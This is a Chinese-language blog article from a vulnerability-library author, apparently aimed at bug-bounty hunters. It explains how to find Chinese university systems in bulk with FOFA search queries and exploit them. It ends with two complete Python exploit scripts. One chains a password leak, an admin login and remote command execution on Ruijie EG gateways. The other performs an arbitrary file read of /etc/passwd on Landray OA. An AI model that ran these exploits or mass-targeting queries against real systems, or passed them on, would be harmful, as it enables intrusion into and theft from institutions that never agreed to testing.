> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nY3HmBJH79qKDXJr5EK99w)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：文章描述🐑**

**经常有师傅问我，怎么刷漏洞，怎么样实现漏洞挖掘，因为原因范围比较广一直没有很好的解释，这里用一篇文章概括下 SRC 挖掘技巧，拿 EduSrc 来举例**

**二:  漏洞挖掘🐇**

**首先需要了解的是，目前已经有了各大搜索引擎，已经将信息收集方面做的比较完善了，并不用定向的对某所高校深度挖掘，而是通过特定的语法将全国使用含有漏洞系统的高校提取出来，进行批量挖掘**

```
高校Org语法
FOFA:  org="China Education and Research Network Center"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjeCAZial70s4WziaWBunYbXibSjBiaudicF0g49AjZkxsczvNmyzHHIV519w/640?wx_fmt=png)

**那这里搜索出来的就是 FOFA 中收录的 Edu 资产了**

**常常看文库的应该知道，每一个漏洞我都会写下 FOFA 语法，这里是为了大家更快的定位企业漏洞资产而设定的，同样可以利用于各大 SRC 的挖掘**

**例如昨天在星球更新了一个新的漏洞**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjGvwbI2kXYH7aiavJ9rP4XWE5K5B88bibNia5pWztiatOJlQMlt0xm4G12Q/640?wx_fmt=png)

**设备的 FOFA 语法为：**

```
app="Ruijie-EG易网关"
```

**挖掘 EduSrc 的 FOFA 语法则为：**

```
app="Ruijie-EG易网关" && org="China Education and Research Network Center"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjZxCEnpk6pnP5ClAUNdaSQdiaZpra14hBQH0d0MWlsjrNGajG1DzGBxA/640?wx_fmt=png)

**注意下有会员的可以排除下蜜罐，常用设备的蜜罐还是蛮多的**

**使用文库中的 POC 测试下漏洞：**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjA0nB5bp4TQCZuesViaUBgZA53cFnicDek9cvesR0pU7r2G5gdKqt2vuw/640?wx_fmt=png)

**测试存在漏洞后就需要确认资产了，由于 FOFA 已经根据 org 组织划分了 Edu 资产，所以简单反查一下就可以了**

```
http://ip.tool.chinaz.com/
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjvJM5gKbiaJ8x03ERueAC1iaa5boibibM5aW887AsfdzwRR9lhz70sHPlXg/640?wx_fmt=png)

**很简单的就得到了资产归属，批量刷一下就行**

**比如学校常用的 OA 系统爆出漏洞并有人公开了，那就是手快有手慢无了，这里拿之前发的** **蓝凌 OA 任意文件读取举例**

```
https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjbcZJuOlB4YgR3aAv2gU3gWWlor6iaVLUHNjge4ygMY8AzvdTO89cRYg/640?wx_fmt=png)

**同样通过 FOFA 搜索资产**

```
app="Landray-OA系统" && org="China Education and Research Network Center"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARjG0H0MkgJsCU1nLiav69vujWratsr3UOym0TIVYfl3Fhl61iclia4tjr6w/640?wx_fmt=png)

**使用 EXP 测试：**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARj3P1XrYZWqEmRghlbpGe4dZTKYqTfoZIFJx5iaNYmb7ssbC0DLoTJQRA/640?wx_fmt=png)

**一样的方法确定资产**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5VFLUqwldLQBQZJicp0XARj2IYueo6SLjNeicasLjQHLUJpatmxsfgHWCwLnwfrrcXC8ic6IynKndww/640?wx_fmt=png)

**到这里大家应该知道怎么刷漏洞了，冲冲冲吧**

**文库地址和知识星球放在下面了（知识星球更新漏洞较提前，喜欢刷漏洞的可以加入)**

 ****三:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

****四:  刚刚的两个 EXP🦉****

```
# 锐捷EG cli.php RCE

#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 锐捷EG网关 cli.php RCE                                      \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
        if "data" in response.text and response.status_code == 200:
            password = re.findall(r'admin (.*?)"', response.text)[0]
            print("\033[36m[o] 成功获取, 账号密码为:  admin   {} \033[0m".format(password))
            POC_2(target_url, password)
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_2(target_url, password):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password={}'.format(password)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在登录..... \033[0m".format(target_url))
        if "status" in response.text and "1" in response.text and response.status_code == 200:
            ruijie_cookie = "RUIJIEID=" + re.findall(r"'Set-Cookie': 'RUIJIEID=(.*?);", str(response.headers))[0] + ";user=admin;"
            print("\033[36m[o] 成功获取管理员Cookie: {} \033[0m".format(ruijie_cookie))
            POC_3(target_url, ruijie_cookie)

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_3(target_url, ruijie_cookie):
    vuln_url = target_url + "/cli.php?a=shell"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "{}".format(ruijie_cookie)
    }
    data = 'notdelay=true&command=cat /etc/passwd'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 cat /etc/passwd..... \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

```
# 蓝凌OA 任意文件读取

#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 蓝凌OA 任意文件读取                                          \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**